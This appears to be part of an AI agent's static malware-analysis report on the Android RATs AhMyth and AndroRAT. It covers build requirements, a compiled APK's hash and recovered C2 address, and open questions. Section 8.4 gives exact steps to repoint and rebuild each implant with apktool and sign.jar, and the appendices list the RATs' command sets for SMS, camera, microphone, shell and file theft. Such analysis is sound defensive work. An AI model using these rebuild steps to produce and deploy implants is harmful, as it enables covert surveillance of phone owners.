**Conclusion: neither RAT can be compiled into an APK on this machine as-is.** Both require the Android SDK (platform + build-tools + platform-tools) and a Gradle distribution, none of which is installed.

### 8.2 AhMyth — requirements and feasibility

`[source]` from `AhMyth-Client/build.gradle` and `app/build.gradle`:
- Android Gradle Plugin **2.3.3** (`com.android.tools.build:gradle:2.3.3`) — the last AGP that **requires Gradle 3.3** and is **incompatible with JDK 21**; AGP 2.3.3 needs **JDK 8**.
- `compileSdkVersion 24`, `buildToolsVersion '25.0.0'`, `minSdkVersion 11`, `targetSdkVersion 24`.
- Repositories: **`jcenter()` only** — JCenter is **shut down/read-only**; the build will fail to resolve `com.android.tools.build:gradle:2.3.3` and the Espresso/JUnit test dependencies unless artifacts are mirrored or `mavenCentral()`/`google()` are substituted.
- Dependency of note: `io.socket:socket.io-client:0.8.3` (excludes `org.json`).

**Blockers to building AhMyth here:** (1) no SDK; (2) AGP 2.3.3 + Gradle 3.3 require **JDK 8**, machine has JDK 21 only; (3) jcenter dead; (4) `buildToolsVersion 25.0.0` is not downloadable from current Google repositories in the normal way. **Practical verdict: not buildable without installing SDK platform 24 + build-tools 25.0.0 + JDK 8 + mirroring jcenter.** Because the server package ships a **pre-decoded implant template** (`Factory/Ahmyth/`) plus `apktool.jar` and `sign.jar`, an operator never needs Gradle at all — the intended path is smali-patch → `apktool b` → `sign.jar`.

### 8.3 AndroRAT — requirements and feasibility

`[source]` from `Android_Code/build.gradle`, `app/build.gradle`, `gradle-wrapper.properties`:
- Android Gradle Plugin **3.5.3**; Gradle **5.4.1** (wrapper URL `gradle-5.4.1-all.zip`).
- `compileSdkVersion 29`, `buildToolsVersion "29.0.2"`, `minSdkVersion 16`, `targetSdkVersion 22`.
- Repositories: `google()` + `jcenter()`.
- Dependencies: `eu.bolt:screenshotty:1.0.2`, `androidx.appcompat:appcompat:1.0.2`, `commons-io:commons-io:2.0.1`, `androidx.constraintlayout:constraintlayout:1.1.3`, test deps.
- `lintOptions { checkReleaseBuilds false }`.

**Minimum toolchain to compile AndroRAT:** JDK 8 (or JDK 11; **not** 21), Android SDK Platform 29 + Build-Tools 29.0.2, Gradle 5.4.1 (wrapper), `google()` still live; `jcenter()` must be mirrored/replaced. The SDK is absent and `.gradle` is uncached — a first build needs ~1–2 GB of downloads.

**Dependency-rot notes** `[source]`: `eu.bolt:screenshotty:1.0.2` is an abandoned library; the README's own caveats stop at Android 9/API 28 and note Android 10 is "unstable". `targetSdkVersion 22` means the APK runs with legacy permission semantics even on modern Android and would be **rejected by Play Protect / blocked from installation by default on Android 14+**.

### 8.4 Fastest path to a compiled APK from here

**AndroRAT — no Gradle required.** `[source]` The repository already contains `Compiled_apk/` (a full apktool-decoded tree), `Android_Code/Jar_utils/apktool.jar`, and `Jar_utils/sign.jar`. The documented flow performs a **one-string edit** in `Compiled_apk/smali/com/example/reverseshell2/config.smali` (the `const-string` two lines below `.line 4`, and below `.line 5`; the `icon` flag at `.line 6`), then `java -jar Jar_utils/apktool.jar b Compiled_apk -o out.apk` and `java -jar Jar_utils/sign.jar -a out.apk --overwrite`. Both jars are present, and a working JDK is required (JDK 21 is present; `sign.jar` is a small self-contained signer, so it is the most likely piece to run under 21 — **unverified**, listed in §9).

**AhMyth — no Gradle required.** `[source]` Edit `Factory/Ahmyth/smali/ahmyth/mine/king/ahmyth/IOSocket.smali` (the `http://…:42474` literal), then `java -jar Factory/apktool.jar b Factory/Ahmyth -o Ahmyth.apk`, then sign with `Factory/sign.jar` + `Factory/testkey.pk8` / `testkey.x509.pem`.

I did **not** execute either build in this task, because the write scope for task-3 covers only the report path, `extractions\T3\`, and `01_SOURCE_mobile\androrat\` — the AhMyth Factory edits would fall outside scope. The AndroRAT raw-APK + raw-smali build is fully unblocked for anyone with that scope and is listed as residual unknown R-4.

---

## 9. Compiled APK evidence

The **only compiled artifact analyzed in this task is the developer-shipped AndroRAT APK**; no APK was built during this task, and AhMyth ships no compiled APK anywhere in its repository `[source]` (the `Factory/Ahmyth/original/` folder holds only binary `AndroidManifest.xml` + `META-INF/CERT.RSA`, `CERT.SF`, `MANIFEST.MF` — no `classes.dex`).

### 9.1 Identity `[apk-binary]`
- Path: `RE_Library\01_SOURCE_mobile\androrat\Android_Code\app\release\app-release.apk`
- SHA-256: `98037b11a118839bef93924a5718c9e988f1c11df507909cdf6bc0cb97189830`
- Size: 2 129 794 bytes; compileSdkVersion "29"/codename "10"; `minSdkVersion 16`, `targetSdkVersion 22`, `versionCode 1`, `versionName 1.0`
- Package: `com.example.reverseshell2`
- JADX 1.5.3 via REA: 1304 classes, 742 resources, 1563 units decompiled; signature verification **not performed**.
- Note: `insomnia` — the developer-shipped companion `.aab` hashes to `2251774ac27de59586de01acecac9aa3d4cc6442b396e6431f8f761eca85b410` (2 366 154 bytes).

### 9.2 C2 target recovered from the compiled DEX `[apk-binary]`
JADX (`jadx -d … app-release.apk`, output retained at `RE_Library\07_OUTPUT\extractions\T3\androrat_apk\jadx\sources\com\example\reverseshell2\config.java`):
```java
public class config {
    public static String IP = "192.168.43.113";
    public static String port = "8000";
}
```
apktool 2.12.0 baksmali (`…\extractions\T3\androrat_apk\apktool\smali\com\example\reverseshell2\config.smali`):
```smali
.field public static IP:Ljava/lang/String; = "192.168.43.113"
.field public static port:Ljava/lang/String; = "8000"
```
Two independent decoders agree. The `icon` field is **absent** from the compiled class, so this build was produced after the icon flag was optimised out or with the field unmodified — the concealment decision in `MainActivity` is therefore `config.icon` defaulting per the builder.

### 9.3 Compiled manifest vs source manifest divergence `[apk-binary]`
The compiled `AndroidManifest.xml` (decoded via REA `inspect_analysis_view`, kind `android`, facet `manifest`, page complete, 3242/3242 UTF-16 code units) declares **only**:
`MainActivity`, `mainService`, `broadcastReciever`, `jobScheduler`.

The repository's source manifest additionally declares `controlPanel`, `keypadListner` (secret code `1337`), `Payloads.videoRecorder`, `Payloads.audioManager`. So the shipped `app-release.apk` is **not** the current source. The compiled APK retains the full permission set (including `SYSTEM_ALERT_WINDOW`) and all three receiver actions (`BOOT_COMPLETED`, `SCREEN_OFF`, `SCREEN_ON`).

### 9.4 Artifact-extraction note
Working decompilation outputs are retained under `RE_Library\07_OUTPUT\extractions\T3\`:
- `androrat_apk\jadx\` — JADX 1.5.3 Java reconstruction of `app-release.apk`
- `androrat_apk\apktool\` — apktool 2.12.0 smali + decoded resources
- `testapk\jadx\` — pipeline-validation run against `ApiDemos-debug.apk`

---

## 10. RESIDUAL UNKNOWNS

- **R-1 — No AhMyth compiled APK exists anywhere in the analyzed set.** The `Factory/Ahmyth/original/` directory contains only `AndroidManifest.xml` + `META-INF/*`; there is no `classes.dex`. All AhMyth claims are therefore **100% `[source]`** (including the shipped implant template's *prebuilt smali*, which is compiler output but was read as text, not executed or verified against a DEX). Whether AhMyth would actually run as written is unverified.
- **R-2 — AhMyth's `Factory/Ahmyth/original/AndroidManifest.xml` is Android binary XML** and could not be parsed by REA (`unsupported binary format`, `file_format_rejected`). Its content was inferred from the decoded sibling `Factory/Ahmyth/AndroidManifest.xml`, which contains the same package/permissions/components. Minor risk that the binary original differs.
- **R-3 — Which AndroRAT build corresponds to which source revision is unresolved.** Three mutually inconsistent C2 configurations exist in one repository (`192.168.0.105:8888` in source, `192.168.43.113:8000` in `app-release.apk`, `127.0.0.1:8080` in `Compiled_apk/`), and `Compiled_apk/apktool.yml` records apktool **2.4.1** while `app-release.apk` was built with a different AGP. The APK's `classes.dex` version string/commit is not recoverable, so **none of the three can be tied to a specific source commit**.
- **R-4 — Neither RAT was built in this task.** The apktool+sign rebuild path (§8.4) is described from `utils.py` and `Constants.js` only. Whether `Jar_utils/sign.jar` and `Factory/sign.jar` execute correctly under JDK 21, and whether `apktool.jar` (bundled, older) round-trips these trees, is **unverified**.
- **R-5 — AndroRAT runtime protocol framing is partially unknown.** The `END123\n` sentinel and Base64 encoding are confirmed from both `utils.py` and `videoRecorder.java`, but the exact per-command request grammar (whether commands are newline-delimited, how `takepic`/`getSMS` arguments are tokenised, and the byte-level behaviour of the `shell` sub-interpreter) was reconstructed from the *help text* and payload classes, not from an executed session. The full `tcpConnection` `AsyncTask` body was read but its truncated middle section means some branch detail is approximated.
- **R-6 — AndroRAT `tcpConnection.java`, `newShell.java`, `audioManager.java`, `CameraPreview.java`, `ipAddr.java` and `locationManager.java` were read with middle sections pruned** by the tooling's output limits. Capability attribution for those files is high confidence from imports/class-level structure and the README command list, but line-level certainty on every method is partial.
- **R-7 — AhMyth `MicManager.java` and `FileManager.java` bodies were likewise partially pruned.** The opcodes, transport and data shapes are certain; exact `AudioRecord` buffer sizing and `walk()` recursion/format details are not fully captured.
- **R-8 — No dynamic/Runtime evidence for either tool.** No APK was executed, no device/emulator was attached (`adb` was checked for presence but no device was queried), no network capture exists. All behavioural claims are static. The AhMyth `x0000mc`/microphone and `x0000ca`/camera code paths in particular are unexecuted.
- **R-9 — AhMyth's DEX/Java survivability on modern Android is unknown.** `minSdkVersion 11`/`targetSdkVersion 24`, no runtime permission requests, `SurfaceTexture(0)` camera trick, and `content://sms` queries all behave differently on API 29+; whether stock AhMyth functions at all on a contemporary device is untested.
- **R-10 — AhMyth's own git history was not traversed.** Only head `97465b1` was analyzed. Earlier/later revisions may contain the ransomware/lock-screen features the mission brief anticipated; **this tree does not**.

---

## Appendix A — AhMyth opcode reference (verbatim from source)

`Constants.orders` `[source]`:
```javascript
exports.order = 'order';
exports.orders = {
    camera: 'x0000ca', fileManager: 'x0000fm', calls: 'x0000cl',
    sms: 'x0000sm', mic: 'x0000mc', location: 'x0000lm', contacts: 'x0000cn',
}
exports.defaultPort = 42474;
exports.IOSocketPath = 'smali/ahmyth/mine/king/ahmyth/IOSocket.smali';
```

`ConnectionManager.java` dispatcher `[source]`: `"x0000ca"` (extra `camList`/`1`/`0`) · `"x0000fm"` (extra `ls`+`path`, `dl`+`path`) · `"x0000sm"` (extra `ls`, `sendSMS`+`to`+`sms`) · `"x0000cl"` · `"x0000cn"` · `"x0000mc"` (`sec`) · `"x0000lm"`.

## Appendix B — AndroRAT Python operator help text (verbatim, `utils.py`) `[source]`

```
deviceInfo                 --> returns basic info of the device
camList                    --> returns cameraID
takepic [cameraID]         --> Takes picture from camera
startVideo [cameraID]      --> starts recording the video
stopVideo                  --> stop recording the video and return the video file
startAudio                 --> starts recording the audio
stopAudio                  --> stop recording the audio
getSMS [inbox|sent]        --> returns inbox sms or sent sms in a file
getCallLogs                --> returns call logs in a file
shell                      --> starts a interactive shell of the device
vibrate [number_of_times]  --> vibrate the device number of time
getLocation                --> return the current location of the device
getIP                      --> returns the ip of the device
getSimDetails              --> returns the details of all sim of the device
clear                      --> clears the screen
getClipData                --> return the current saved text from the clipboard
getMACAddress              --> returns the mac address of the device
exit                       --> exit the interpreter
```
Shell sub-commands (`README.md`): `get [full_file_path]` (download, ≤15 MB) · `put [filename]` (upload to device).
